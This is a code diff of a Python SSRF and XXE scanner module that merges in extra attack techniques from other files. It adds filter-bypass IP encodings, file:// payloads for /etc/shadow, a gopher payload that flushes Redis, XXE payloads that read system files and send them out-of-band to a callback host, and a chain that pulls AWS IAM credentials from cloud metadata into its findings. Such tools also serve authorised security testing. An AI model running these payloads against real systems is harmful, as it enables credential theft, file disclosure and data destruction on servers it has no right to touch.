@@ -1,7 +1,5 @@
 from __future__ import annotations
-import concurrent.futures as _fut
 import time
-import json
 import logging
 import re
 import requests
@@ -112,7 +110,60 @@ METADATA_MARKERS = [
 _INTERNAL_IPS = ["127.0.0.1", "localhost", "0.0.0.0"]
 _SCAN_PORTS = [21, 22, 80, 443, 2375, 3306, 5432, 5672, 6379, 8080, 8443, 8888, 9200, 27017]
 
-# URL scheme abuse payloads — core + ssrf.txt wordlist
+# ---------------------------------------------------------------------------
+# Enhanced IP obfuscation table (merged from ssrf.py _IP_OBFUSCATIONS)
+# Covers bypass of naive SSRF allow-lists/deny-lists
+# ---------------------------------------------------------------------------
+_IP_OBFUSCATIONS: Dict[str, List[str]] = {
+    "localhost": [
+        "127.0.0.1", "2130706433",      # decimal
+        "0x7f000001",                    # hex single
+        "0177.0.0.1",                   # octal
+        "127.0.0.0x01",                # mixed
+        "[::]",                         # IPv6 any
+        "[::1]",                        # IPv6 loopback
+        "localhost.",                   # trailing dot
+        "LOCALHOST",                    # uppercase
+        "0:0:0:0:0:ffff:7f00:0001",    # IPv6 mapped
+        "localtest.me",                # public DNS -> 127.0.0.1
+    ],
+    "169.254.169.254": [
+        "2852039166",                   # decimal
+        "0xa9fea9fe",                   # hex
+        "0251.0376.0251.0376",         # octal
+        "169.254.169.254.",            # trailing dot
+        "[::ffff:a9fe:a9fe]",          # IPv6 mapped
+        "169.254.169.254%2F",          # URL encoded slash
+    ],
+}
+
+# ---------------------------------------------------------------------------
+# Internal service fingerprinting signatures (from ssrf.py SSRFLateralMovementProber)
+# ---------------------------------------------------------------------------
+_SERVICE_SIGNATURES: Dict[str, re.Pattern] = {
+    "Redis":          re.compile(r"PONG|redis_version|\+OK", re.I),
+    "Elasticsearch":  re.compile(r"cluster_name|tagline|version.*number", re.I),
+    "Docker API":     re.compile(r"ApiVersion|OSType|ServerVersion", re.I),
+    "MongoDB":        re.compile(r"ismaster|maxBsonObjectSize|ok.*1", re.I),
+    "Kubernetes API": re.compile(r"kind.*Status|apiVersion|Unauthorized", re.I),
+    "Consul":         re.compile(r"Config|Datacenter|NodeName", re.I),
+    "Prometheus":     re.compile(r"go_gc_duration|# TYPE|# HELP", re.I),
+    "Grafana":        re.compile(r"Grafana|grafana_info|dashboards", re.I),
+}
+
+# Known internal service endpoints for fingerprinting
+_INTERNAL_SERVICE_TARGETS = [
+    "http://127.0.0.1:9200/_cat/indices",               # Elasticsearch
+    "http://127.0.0.1:2375/v1.24/containers/json",      # Docker API
+    "http://127.0.0.1:8500/v1/agent/self",              # Consul
+    "http://127.0.0.1:9090/metrics",                    # Prometheus
+    "http://127.0.0.1:3000/api/health",                 # Grafana
+    "http://172.17.0.1:2375/v1.24/containers/json",     # Docker bridge
+]
+
+# ---------------------------------------------------------------------------
+# URL scheme payloads — extended with ftp/ldap/sftp from ssrf.py
+# ---------------------------------------------------------------------------
 _SCHEME_PAYLOADS_CORE = [
     "file:///etc/passwd",
     "file:///etc/shadow",
@@ -122,7 +173,20 @@ _SCHEME_PAYLOADS_CORE = [
     "dict://127.0.0.1:6379/info",
     "dict://127.0.0.1:11211/stats",
     "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
+    # Extended protocols (from ssrf.py SSRFProtocolExpander)
+    "ftp://127.0.0.1:21/",
+    "ldap://127.0.0.1:389/",
+    "sftp://127.0.0.1:22/",
 ]
+
+# Protocol-specific response detection patterns
+_PROTOCOL_DETECT: Dict[str, re.Pattern] = {
+    "ftp://":    re.compile(r"220|230|ftp", re.I),
+    "ldap://":   re.compile(r"objectClass|dc=", re.I),
+    "sftp://":   re.compile(r"ssh-|protocol|banner", re.I),
+    "dict://":   re.compile(r"redis_version|OS:", re.I),
+    "gopher://": re.compile(r"\+OK|PONG", re.I),
+}
 
 def _load_ssrf_payloads() -> list:
     seen = set(_SCHEME_PAYLOADS_CORE)
@@ -135,19 +199,28 @@ def _load_ssrf_payloads() -> list:
 
 _SCHEME_PAYLOADS = _load_ssrf_payloads()
 
-# XXE template — {U} will be replaced with the target URI
+# OOB fallback host (used if no OAST domain configured)
+_OOB_HOST = "ssrf-xxe-wsp.invalid"
+
+# XXE templates
 XXE_POC = """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE x [ <!ENTITY ext SYSTEM "{U}"> ]>
 <root><v>&ext;</v></root>"""
 
-# XXE via SVG (for image upload endpoints)
 XXE_SVG = """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "{U}"> ]>
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <text>&xxe;</text>
 </svg>"""
 
-# XXE file targets — core + xxe.txt wordlist (file:// URI'leri çıkar)
+# XML endpoint auto-discovery paths (from xxe.py)
+_XML_PATHS = [
+    "/api/import", "/api/upload", "/api/xml", "/api/soap",
+    "/soap", "/wsdl", "/services", "/api/data",
+    "/import", "/upload", "/api/v1/import", "/api/v1/xml",
+]
+
+# XXE file targets — core + xxe.txt wordlist
 _XXE_TARGETS_CORE = [
     "file:///etc/passwd",
     "file:///etc/hostname",
@@ -155,11 +228,18 @@ _XXE_TARGETS_CORE = [
     "file:///windows/win.ini",
 ]
 
+# Extended file list for all XXE sub-techniques
+_XXE_TARGET_FILES = [
+    "/etc/passwd", "/etc/shadow", "/etc/hosts",
+    "/proc/self/environ", "/proc/self/cmdline",
+    "/windows/win.ini", "/windows/system32/drivers/etc/hosts",
+    "C:\\Windows\\win.ini", "C:\\boot.ini",
+]
+
 def _load_xxe_targets() -> list:
     seen = set(_XXE_TARGETS_CORE)
     ext = []
     for line in load_external_payloads("xxe"):
-        # xxe.txt'den file:// ve http:// URI'lerini çıkar
         import re as _re
         for m in _re.finditer(r'(?:SYSTEM\s+"([^"]+)"|href="([^"]+)")', line):
             uri = m.group(1) or m.group(2)
@@ -170,7 +250,7 @@ def _load_xxe_targets() -> list:
 
 _XXE_TARGETS = _load_xxe_targets()
 
-# XXE success markers (content that should NOT appear in normal responses)
+# XXE success markers
 _XXE_MARKERS = [
     r"root:x:0:0",
     r"\[fonts\]",
@@ -191,16 +271,24 @@ ERROR_FINGERPRINTS = [
 # =============================================================================
 
 def _encode_ip_variants(ip: str) -> List[str]:
-    """Generate IP address encoding variants to bypass naive SSRF filters."""
+    """
+    Generate IP encoding variants to bypass SSRF allow-lists.
+    Uses the enhanced _IP_OBFUSCATIONS table for known IPs,
+    falls back to standard numeric encoding for others.
+    """
+    # Use the richer table for known IPs
+    for canonical, variants in _IP_OBFUSCATIONS.items():
+        if ip == canonical or ip in variants:
+            return list(variants)
+    # Fallback: generate numeric variants
     try:
         a, b, c, d = (int(x) for x in ip.split("."))
         return [
             ip,
-            ".".join(f"{p:03o}" for p in (a, b, c, d)),                        # Octal
-            ".".join(f"{p:02x}" for p in (a, b, c, d)),                        # Hex dotted
-            str(a * (256 ** 3) + b * (256 ** 2) + c * 256 + d),               # Decimal
-            "0x" + "".join(f"{p:02x}" for p in (a, b, c, d)),                 # Hex single
-            f"0177.0.0.1" if ip == "127.0.0.1" else ip,                        # Mixed octal
+            ".".join(f"{p:03o}" for p in (a, b, c, d)),                       # Octal
+            ".".join(f"{p:02x}" for p in (a, b, c, d)),                       # Hex dotted
+            str(a * (256 ** 3) + b * (256 ** 2) + c * 256 + d),              # Decimal
+            "0x" + "".join(f"{p:02x}" for p in (a, b, c, d)),                # Hex single
         ]
     except ValueError:
         return [ip]
@@ -226,8 +314,49 @@ def _detect_xxe_in_response(text: str) -> Optional[str]:
     return None
 
 
+def _detect_xml_endpoints(base_url: str, session) -> List[str]:
+    """
+    Scan common XML-accepting paths and return reachable ones.
+    Falls back to base_url if none are found. (Ported from xxe.py)
+    """
+    found = []
+    parsed = urlparse(base_url)
+    base = f"{parsed.scheme}://{parsed.netloc}"
+    for path in _XML_PATHS:
+        url = urljoin(base + "/", path.lstrip("/"))
+        try:
+            r = session.get(url, timeout=5, verify=False)
+            if r.status_code not in (404, 410):
+                found.append(url)
+        except Exception:
+            pass
+    return found or [base_url]
+
+
+def _post_xml_payload(session, url: str, xml: str, timeout: int = 10) -> Optional[requests.Response]:
+    """POST XML payload with appropriate content-type. (Ported from xxe.py)"""
+    for ct in ["application/xml", "text/xml"]:
+        try:
+            r = session.post(
+                url, data=xml.encode("utf-8"),
+                headers={"Content-Type": ct}, timeout=timeout, verify=False,
+            )
+            return r
+        except Exception:
+            pass
+    return None
+
+
+def _identify_service(body: str) -> Optional[str]:
+    """Match response body against known internal service signatures."""
+    for service, pattern in _SERVICE_SIGNATURES.items():
+        if pattern.search(body):
+            return service
+    return None
+
+
 # =============================================================================
-# SSRFScanner — proper BaseScanner subclass
+# SSRFScanner
 # =============================================================================
 
 class SSRFScanner(BaseScanner):
@@ -236,11 +365,14 @@ class SSRFScanner(BaseScanner):
 
     Techniques:
     - Cloud metadata endpoint probing (AWS, GCP, Azure, Alibaba)
-    - IP encoding variants (octal, hex, decimal) to bypass allow-lists
-    - URL scheme abuse (file://, gopher://, dict://)
+    - Enhanced IP encoding variants (10+ localhost bypass variants)
+    - AWS IAM credential chain extraction (role -> secret keys)
+    - URL scheme abuse: file://, gopher://, dict://, ftp://, ldap://, sftp://
+    - Protocol-specific response fingerprinting
     - Internal port scanning via response timing
-    - OAST DNS callback if dns_domain is configured in OASTConfig
+    - Internal service fingerprinting (Redis, Elasticsearch, Docker, MongoDB, etc.)
     - Body-based SSRF (POST parameters containing URL fields)
+    - OAST DNS callback (when dns_domain is configured)
     """
 
     name = "ssrf"
@@ -274,7 +406,10 @@ class SSRFScanner(BaseScanner):
             if self.config.oast.enable_metadata_probes:
                 self._test_internal_ports(url, param, bucket)
 
-        # Body-based SSRF: probe POST endpoints regardless of query params
+        # Service fingerprinting via SSRF injection
+        self._test_service_fingerprint(url, url_params[:2] if url_params else [], bucket)
+
+        # Body-based SSRF
         self._test_body_ssrf(url, bucket)
 
         # OAST DNS callback
@@ -282,7 +417,7 @@ class SSRFScanner(BaseScanner):
             self._test_oast_dns(url, url_params, bucket)
 
     # -------------------------------------------------------------------------
-    # Cloud metadata probing
+    # Cloud metadata probing with AWS credential chain extraction
     # -------------------------------------------------------------------------
 
     def _test_cloud_metadata(self, url: str, param: str, qs: List[Tuple], bucket: str):
@@ -299,10 +434,29 @@ class SSRFScanner(BaseScanner):
         for meta_url, extra_headers, cloud in metadata_targets:
             t_url = _inject_url_param(url, param, meta_url)
             try:
-                headers = {**extra_headers}
-                resp = self.session.get(t_url, headers=headers, timeout=4, allow_redirects=True)
+                resp = self.session.get(t_url, headers=extra_headers, timeout=4,
+                                        allow_redirects=True)
                 if resp.status_code == 200 and _has_metadata_marker(resp.text):
-                    self.add(bucket, {
+                    # AWS credential chain: if IAM credentials endpoint found, extract role name
+                    credential_data = None
+                    if cloud == "AWS" and "security-credentials" in meta_url:
+                        role_match = re.search(r"([A-Za-z0-9_\-]+)", resp.text)
+                        if role_match:
+                            role_name = role_match.group(1)
+                            cred_meta_url = meta_url.rstrip("/") + "/" + role_name
+                            cred_t_url = _inject_url_param(url, param, cred_meta_url)
+                            try:
+                                cred_resp = self.session.get(cred_t_url, timeout=6)
+                                cred_body = cred_resp.text[:1000]
+                                if "AccessKeyId" in cred_body or "SecretAccessKey" in cred_body:
+                                    credential_data = {
+                                        "role": role_name,
+                                        "cred_snippet": cred_body[:300],
+                                    }
+                            except Exception:
+                                pass
+
+                    finding = {
                         "type": "SSRF — Cloud Metadata Exposed",
                         "severity": "Critical",
                         "url": url,
@@ -310,14 +464,17 @@ class SSRFScanner(BaseScanner):
                         "payload": meta_url,
                         "cloud_provider": cloud,
                         "evidence": resp.text[:300],
-                    })
+                    }
+                    if credential_data:
+                        finding["credentials_extracted"] = credential_data
+                    self.add(bucket, finding)
                     logger.warning(f"[SSRF] Cloud metadata ({cloud}) via {url} param={param}")
-                    return  # one confirmed finding per param is sufficient
+                    return
             except requests.exceptions.RequestException as exc:
                 logger.debug(f"[SSRF] Cloud metadata probe failed for {meta_url!r}: {exc!r}")
 
     # -------------------------------------------------------------------------
-    # URL scheme abuse
+    # URL scheme abuse — extended with ftp/ldap/sftp/protocol fingerprinting
     # -------------------------------------------------------------------------
 
     def _test_scheme_abuse(self, url: str, param: str, bucket: str):
@@ -328,9 +485,9 @@ class SSRFScanner(BaseScanner):
             t_url = _inject_url_param(url, param, payload)
             try:
                 resp = self.session.get(t_url, timeout=6, allow_redirects=False)
-                # Success: either content returned or a redirect to the scheme-fetched resource
                 text = resp.text or ""
-                # file:///etc/passwd marker
+
+                # file:// markers
                 if "root:x:0:0" in text or "[fonts]" in text or "for 16-bit" in text:
                     self.add(bucket, {
                         "type": "SSRF — URL Scheme Abuse (LFI via file://)",
@@ -341,7 +498,22 @@ class SSRFScanner(BaseScanner):
                         "evidence": text[:200],
                     })
                     return
-                # gopher/dict: if server responds with data, it fetched the URL
+
+                # Protocol-specific fingerprint detection
+                scheme_prefix = (payload.split("://")[0] + "://") if "://" in payload else ""
+                detect_re = _PROTOCOL_DETECT.get(scheme_prefix)
+                if detect_re and resp.status_code == 200 and detect_re.search(text):
+                    self.add(bucket, {
+                        "type": f"SSRF — URL Scheme Abuse ({scheme_prefix})",
+                        "severity": "High",
+                        "url": url,
+                        "parameter": param,
+                        "payload": payload,
+                        "evidence": text[:200],
+                    })
+                    return
+
+                # Generic gopher/dict positive detection
                 if payload.startswith(("dict://", "gopher://")) and resp.status_code == 200 and len(text) > 10:
                     self.add(bucket, {
                         "type": f"SSRF — URL Scheme Abuse ({payload.split(':')[0]}://)",
@@ -360,21 +532,12 @@ class SSRFScanner(BaseScanner):
     # -------------------------------------------------------------------------
 
     def _test_internal_ports(self, url: str, param: str, bucket: str):
-        """
-        Probes internal ports by injecting http://127.0.0.1:<port> and measuring timing.
-        Open ports: server-side request succeeds quickly.
-        Closed ports: immediate connection refused (fast).
-        Filtered ports: TCP timeout (slow, > timing_threshold).
-        """
         threshold = self.config.oast.timing_threshold
-
-        # Establish baseline timing
         try:
             t0 = time.time()
             self.session.get(url, timeout=5)
             baseline = time.time() - t0
-        except requests.exceptions.RequestException as exc:
-            logger.debug(f"[SSRF] Baseline request failed for {url!r}: {exc!r}")
+        except requests.exceptions.RequestException:
             baseline = 1.0
 
         for ip in ["127.0.0.1", "localhost"]:
@@ -386,18 +549,18 @@ class SSRFScanner(BaseScanner):
                     resp = self.session.get(t_url, timeout=threshold + 2, allow_redirects=False)
                     elapsed = time.time() - t0
                     text = resp.text or ""
-                    # Open port signals: 200 response with content, or very fast response
                     if resp.status_code == 200 and len(text) > 10:
+                        service = _identify_service(text)
                         self.add(bucket, {
                             "type": f"SSRF — Internal Port Open: {ip}:{port}",
                             "severity": "High",
                             "url": url,
                             "parameter": param,
                             "payload": probe_url,
+                            "service": service or "Unknown",
                             "evidence": f"HTTP 200 with {len(text)} bytes in {elapsed:.2f}s",
                         })
                     elif elapsed > baseline + threshold:
-                        # Timeout -> port is filtered -> still SSRF-reachable (blind)
                         self.add(bucket, {
                             "type": f"SSRF — Blind Internal Port Probe: {ip}:{port}",
                             "severity": "Medium",
@@ -408,6 +571,42 @@ class SSRFScanner(BaseScanner):
                         })
                 except requests.exceptions.RequestException as exc:
                     logger.debug(f"[SSRF] Internal port probe failed for {probe_url!r}: {exc!r}")
+
+    # -------------------------------------------------------------------------
+    # Internal service fingerprinting (from ssrf.py SSRFLateralMovementProber)
+    # -------------------------------------------------------------------------
+
+    def _test_service_fingerprint(self, url: str, params: List[str], bucket: str):
+        """
+        Probe known internal service endpoints via SSRF injection.
+        Identifies Redis, Elasticsearch, Docker API, MongoDB, Consul, etc.
+        """
+        if not params:
+            return
+        param = params[0]
+
+        for service_url in _INTERNAL_SERVICE_TARGETS:
+            t_url = _inject_url_param(url, param, service_url)
+            try:
+                resp = self.session.get(t_url, timeout=5, allow_redirects=True)
+                body = (resp.text or "")[:2000]
+                if resp.status_code in (200, 401, 403):
+                    service = _identify_service(body)
+                    if service:
+                        self.add(bucket, {
+                            "type": "SSRF — Internal Service Fingerprinted",
+                            "severity": "High",
+                            "url": url,
+                            "parameter": param,
+                            "payload": service_url,
+                            "service": service,
+                            "evidence": body[:300],
+                        })
+                        logger.warning(
+                            f"[SSRF] Internal {service} at {service_url} via {url} param={param}"
+                        )
+            except requests.exceptions.RequestException as exc:
+                logger.debug(f"[SSRF] Service fingerprint failed for {service_url!r}: {exc!r}")
 
     # -------------------------------------------------------------------------
     # Body-based SSRF
@@ -441,7 +640,6 @@ class SSRFScanner(BaseScanner):
         domain = self.config.oast.dns_domain
         if not domain:
             return
-
         token = random_string(8)
         callback_url = f"http://{token}.{domain}/"
 
@@ -449,8 +647,6 @@ class SSRFScanner(BaseScanner):
             t_url = _inject_url_param(url, param, callback_url)
             try:
                 self.session.get(t_url, timeout=self.config.oast.timeout, allow_redirects=True)
-                # DNS resolution will occur server-side; detection requires an OAST listener
-                # Flag as potential SSRF for manual confirmation
                 self.add(bucket, {
                     "type": "SSRF — OAST DNS Callback Sent",
                     "severity": "High",
@@ -466,7 +662,7 @@ class SSRFScanner(BaseScanner):
 
 
 # =============================================================================
-# XXEScanner — proper BaseScanner subclass
+# XXEScanner
 # =============================================================================
 
 class XXEScanner(BaseScanner):
@@ -474,11 +670,15 @@ class XXEScanner(BaseScanner):
     XML External Entity (XXE) Injection Scanner.
 
     Techniques:
-    - Detect XML-accepting endpoints (Content-Type: application/xml responses or form XML inputs)
-    - Inject XXE_POC template targeting /etc/passwd, /etc/hostname, /proc/self/environ
-    - Error-based XXE detection (file contents in response)
-    - XXE via SVG upload (for endpoints accepting SVG)
-    - Blind XXE detection via timing (OOB connection attempt)
+    - Auto-detect XML-accepting endpoints (/api/xml, /soap, /wsdl, etc.)
+    - Classic in-band file read (file:///etc/passwd)
+    - CDATA wrapper bypass (combine internal + external DTD entities)
+    - Error-based XXE (parameter entity chain forces parse error with file content)
+    - Billion Laughs lite (nested entity expansion DoS detection, safe 3-level)
+    - External parameter entity double-wrapping file read
+    - XXE via SVG upload (image upload endpoints)
+    - Blind XXE via OAST DNS callback
+    - OOB HTTP data exfiltration via timing detection
     """
 
     name = "xxe"
@@ -502,31 +702,47 @@ class XXEScanner(BaseScanner):
         return self.results
 
     def _scan_endpoint(self, url: str, bucket: str):
-        # 1. Probe as XML POST endpoint
-        self._test_xml_post(url, bucket)
+        # Auto-discover XML-accepting endpoints at this target
+        xml_endpoints = _detect_xml_endpoints(url, self.session)
 
-        # 2. Test SVG upload if endpoint looks like it accepts files
+        for ep in xml_endpoints[:4]:
+            # Classic in-band read
+            self._test_xml_post(ep, bucket)
+            # CDATA bypass
+            self._test_cdata_bypass(ep, bucket)
+            # Error-based parameter entity
+            self._test_error_based_param_entity(ep, bucket)
+            # Billion Laughs DoS detection (safe)
+            self._test_param_entity_nested(ep, bucket)
+            # External parameter entity double-wrap
+            self._test_param_entity_external(ep, bucket)
+
+        # SVG upload on original URL
         self._test_svg_xxe(url, bucket)
 
-        # 3. Blind XXE via OAST if configured
+        # OAST-based blind detection
         if self.config.oast.dns_domain:
-            self._test_blind_xxe_oast(url, bucket)
+            for ep in xml_endpoints[:2]:
+                self._test_blind_xxe_oast(ep, bucket)
+                self._test_oob_http_exfil(ep, bucket)
 
     # -------------------------------------------------------------------------
-    # Error-based XXE via direct XML POST
+    # Classic in-band file read
     # -------------------------------------------------------------------------
 
     def _test_xml_post(self, url: str, bucket: str):
         for target_file in _XXE_TARGETS:
             payload = XXE_POC.replace("{U}", target_file)
-            headers = {"Content-Type": "application/xml"}
             try:
-                resp = self.session.post(url, data=payload.encode(), headers=headers, timeout=8)
+                resp = self.session.post(
+                    url, data=payload.encode(),
+                    headers={"Content-Type": "application/xml"}, timeout=8,
+                )
                 text = resp.text or ""
                 marker = _detect_xxe_in_response(text)
                 if marker:
                     self.add(bucket, {
-                        "type": "XXE — Error-Based File Read",
+                        "type": "XXE — Classic In-Band File Read",
                         "severity": "Critical",
                         "url": url,
                         "payload_target": target_file,
@@ -534,7 +750,6 @@ class XXEScanner(BaseScanner):
                     })
                     logger.warning(f"[XXE] File read confirmed at {url} via {target_file}")
                     return
-                # Also check for XML parse errors (reveals parser / DOCTYPE processing)
                 if re.search(r"(?i)XML.*parse.*error|DOCTYPE.*not.*allowed|entity.*not.*permitted", text):
                     self.add(bucket, {
                         "type": "XXE — DOCTYPE Processing Detected",
@@ -546,6 +761,135 @@ class XXEScanner(BaseScanner):
                     return
             except requests.exceptions.RequestException as exc:
                 logger.debug(f"[XXE] XML POST probe failed for {target_file!r}: {exc!r}")
+
+    # -------------------------------------------------------------------------
+    # CDATA bypass (ported from xxe.py XXEErrorBasedExtractor._probe_cdata)
+    # -------------------------------------------------------------------------
+
+    def _test_cdata_bypass(self, url: str, bucket: str):
+        """CDATA wrapper bypass — wraps file content in CDATA to avoid XML parse errors."""
+        oob_host = self.config.oast.dns_domain or _OOB_HOST
+        for fpath in _XXE_TARGET_FILES[:3]:
+            xml = (
+                '<?xml version="1.0"?>'
+                '<!DOCTYPE foo ['
+                '  <!ENTITY % start "<![CDATA[">'
+                f'  <!ENTITY % content SYSTEM "file://{fpath}">'
+                '  <!ENTITY % end "]]>">'
+                f'  <!ENTITY % dtd SYSTEM "http://{oob_host}/__cdata.dtd">'
+                '  %dtd;'
+                ']>'
+                '<root><data>&joined;</data></root>'
+            )
+            resp = _post_xml_payload(self.session, url, xml, timeout=8)
+            if resp is None:
+                continue
+            body = (resp.text or "")[:3000]
+            if re.search(r"root:.*:0:0:|Administrator", body):
+                self.add(bucket, {
+                    "type": "XXE — CDATA Bypass File Read",
+                    "severity": "Critical",
+                    "url": url,
+                    "payload_target": fpath,
+                    "evidence": body[:300],
+                })
+                logger.warning(f"[XXE] CDATA bypass confirmed at {url}")
+                return
+
+    # -------------------------------------------------------------------------
+    # Error-based parameter entity (ported from xxe.py XXEErrorBasedExtractor._probe_error_based)
+    # -------------------------------------------------------------------------
+
+    def _test_error_based_param_entity(self, url: str, bucket: str):
+        """Parameter entity chaining — parse error forces file content into error message."""
+        for fpath in _XXE_TARGET_FILES[:3]:
+            xml = (
+                '<?xml version="1.0"?>'
+                '<!DOCTYPE foo ['
+                f'  <!ENTITY % file SYSTEM "file://{fpath}">'
+                '  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM'
+                f"  'file:///fake/%file;'>\">"
+                '  %eval; %exfil;'
+                ']>'
+                '<root><id>wstest</id></root>'
+            )
+            resp = _post_xml_payload(self.session, url, xml, timeout=8)
+            if resp is None:
+                continue
+            body = (resp.text or "")[:3000]
+            if re.search(r"root:.*:0:0:|Administrator|error.*file|no such file", body, re.I):
+                self.add(bucket, {
+                    "type": "XXE — Error-Based File Leak (Parameter Entity)",
+                    "severity": "Critical",
+                    "url": url,
+                    "payload_target": fpath,
+                    "evidence": body[:300],
+                })
+                logger.warning(f"[XXE] Error-based param entity confirmed at {url}")
+                return
+
+    # -------------------------------------------------------------------------
+    # Billion Laughs DoS detection (ported from xxe.py XXEParameterEntityProber._probe_nested)
+    # -------------------------------------------------------------------------
+
+    def _test_param_entity_nested(self, url: str, bucket: str):
+        """Billion Laughs lite — 3 levels, safe (no OOM risk), detects DoS-vulnerable parsers."""
+        xml = (
+            '<?xml version="1.0"?>'
+            '<!DOCTYPE lolz ['
+            '  <!ENTITY lol "lol">'
+            '  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;">'
+            '  <!ENTITY lol2 "&lol1;&lol1;&lol1;">'
+            ']>'
+            '<root>&lol2;</root>'
+        )
+        t0 = time.time()
+        resp = _post_xml_payload(self.session, url, xml, timeout=10)
+        elapsed = time.time() - t0
+        if resp is None:
+            return
+        body = (resp.text or "")[:500]
+        if elapsed > 5 or len(body) > 1000:
+            self.add(bucket, {
+                "type": "XXE — Nested Entity Expansion (DoS Risk)",
+                "severity": "High",
+                "url": url,
+                "evidence": (
+                    f"Response took {elapsed:.2f}s, body {len(body)} bytes — "
+                    "entity expansion suspected (Billion Laughs variant)"
+                ),
+            })
+
+    # -------------------------------------------------------------------------
+    # External parameter entity double-wrap (ported from xxe.py XXEParameterEntityProber._probe_external_param)
+    # -------------------------------------------------------------------------
+
+    def _test_param_entity_external(self, url: str, bucket: str):
+        """External parameter entity via double entity wrapping."""
+        for fpath in _XXE_TARGET_FILES[:3]:
+            xml = (
+                '<?xml version="1.0"?>'
+                '<!DOCTYPE foo ['
+                f'  <!ENTITY % remote SYSTEM "file://{fpath}">'
+                '  <!ENTITY % wrap "<!ENTITY content \'%remote;\'>">'
+                '  %wrap;'
+                ']>'
+                f'<root><data>&content;</data></root>'
+            )
+            resp = _post_xml_payload(self.session, url, xml, timeout=8)
+            if resp is None:
+                continue
+            body = (resp.text or "")[:3000]
+            if re.search(r"root:.*:0:0:|Administrator|bin/bash|\[fonts\]", body):
+                self.add(bucket, {
+                    "type": "XXE — External Parameter Entity File Read",
+                    "severity": "Critical",
+                    "url": url,
+                    "payload_target": fpath,
+                    "evidence": body[:300],
+                })
+                logger.warning(f"[XXE] External param entity confirmed at {url}")
+                return
 
     # -------------------------------------------------------------------------
     # XXE via SVG upload
@@ -584,10 +928,12 @@ class XXEScanner(BaseScanner):
         token = random_string(8)
         oast_url = f"http://{token}.{domain}/"
         payload = XXE_POC.replace("{U}", oast_url)
-        headers = {"Content-Type": "application/xml"}
         try:
-            self.session.post(url, data=payload.encode(), headers=headers,
-                              timeout=self.config.oast.timeout)
+            self.session.post(
+                url, data=payload.encode(),
+                headers={"Content-Type": "application/xml"},
+                timeout=self.config.oast.timeout,
+            )
             self.add(bucket, {
                 "type": "XXE — Blind OOB DNS Callback Sent",
                 "severity": "High",
@@ -599,34 +945,71 @@ class XXEScanner(BaseScanner):
         except requests.exceptions.RequestException as exc:
             logger.debug(f"[XXE] Blind OOB DNS probe failed for {url!r}: {exc!r}")
 
+    # -------------------------------------------------------------------------
+    # OOB HTTP exfiltration via timing (ported from xxe.py XXEOOBDataExfilChain._probe_http_oob)
+    # -------------------------------------------------------------------------
+
+    def _test_oob_http_exfil(self, url: str, bucket: str):
+        """HTTP OOB exfiltration attempt — timing-based detection."""
+        oob_host = self.config.oast.dns_domain or _OOB_HOST
+        token = random_string(8)
+        for fpath in _XXE_TARGET_FILES[:2]:
+            exfil_url = f"http://{oob_host}/xxe?d={token}&f={fpath.replace('/', '_')}"
+            xml = (
+                '<?xml version="1.0"?>'
+                '<!DOCTYPE foo ['
+                f'  <!ENTITY % file SYSTEM "file://{fpath}">'
+                f'  <!ENTITY % exfil SYSTEM "{exfil_url}&data=%file;">'
+                '  %exfil;'
+                ']>'
+                '<root><data>test</data></root>'
+            )
+            t0 = time.time()
+            resp = _post_xml_payload(self.session, url, xml, timeout=10)
+            elapsed = time.time() - t0
+            if resp and elapsed > 2.5:
+                self.add(bucket, {
+                    "type": "XXE — HTTP OOB Exfiltration (Timing)",
+                    "severity": "High",
+                    "url": url,
+                    "payload_target": fpath,
+                    "evidence": (
+                        f"HTTP OOB attempt took {elapsed:.1f}s — "
+                        f"server may have contacted {oob_host}"
+                    ),
+                    "note": "Confirm OOB request in your OAST/listener logs",
+                })
+                logger.info(f"[XXE] OOB HTTP timing hint at {url}, delay={elapsed:.1f}s")
+                return
+
 
 # =============================================================================
-# Legacy entry points (backward-compatible with main.py dynamic import)
+# Legacy entry points (backward-compatible with main.py / phases runner)
 # =============================================================================
 
 def run_ssrf_xxe_scan(ctx, oast_cfg: Dict = None, **kwargs):
     """
     Legacy entry point using ScanContext from main.py.
     Delegates to SSRFScanner and XXEScanner.
-    oast_cfg: interactsh dns_domain dahil OAST ayarları (phases runner'dan geçirilir)
+    oast_cfg: interactsh dns_domain + OAST settings (passed from phases runner).
     """
     session = ctx.session if hasattr(ctx, "session") else kwargs.get("session")
     results = getattr(ctx, "results", {}) or kwargs.get("results", {})
 
-    # oast_cfg: phases runner'dan gelebilir veya ctx.config'den okunur
     if oast_cfg is None:
         cfg = getattr(ctx, "config", {}) or {}
         oast_cfg = cfg.get("oast", {}) or {}
 
-    # OAST config oluştur
-    dns_domain = (oast_cfg or {}).get("dns_domain") or (oast_cfg or {}).get("interactsh", {}).get("server", "")
+    dns_domain = (
+        (oast_cfg or {}).get("dns_domain")
+        or (oast_cfg or {}).get("interactsh", {}).get("server", "")
+    )
     oast_config = OASTConfig(
         enabled=bool((oast_cfg or {}).get("enabled", True)),
         dns_domain=dns_domain or None,
     )
     ssrf_xxe_cfg = SSRFXXEConfig(oast=oast_config)
 
-    # Collect endpoints
     endpoints: Set[str] = set(results.get("endpoints", []))
     if hasattr(ctx, "endpoints") and ctx.endpoints:
         endpoints.update(ctx.endpoints)
@@ -638,14 +1021,20 @@ def run_ssrf_xxe_scan(ctx, oast_cfg: Dict = None, **kwargs):
 
     targets = list(endpoints)
     if not targets:
-        base = (getattr(ctx, "url", None) or getattr(ctx, "base_url", None)
-                or getattr(ctx, "target", None) or "")
+        base = (
+            getattr(ctx, "url", None)
+            or getattr(ctx, "base_url", None)
+            or getattr(ctx, "target", None)
+            or ""
+        )
         if base:
             targets = [base]
         else:
             return
 
-    logger.info(f"[SSRF/XXE] Scanning {len(targets)} endpoints (oast_domain={dns_domain or 'none'})")
+    logger.info(
+        f"[SSRF/XXE] Scanning {len(targets)} endpoints (oast_domain={dns_domain or 'none'})"
+    )
 
     ssrf = SSRFScanner(session=session, results=results, config=ssrf_xxe_cfg)
     ssrf.run(targets[0] if targets else "", endpoints=targets)
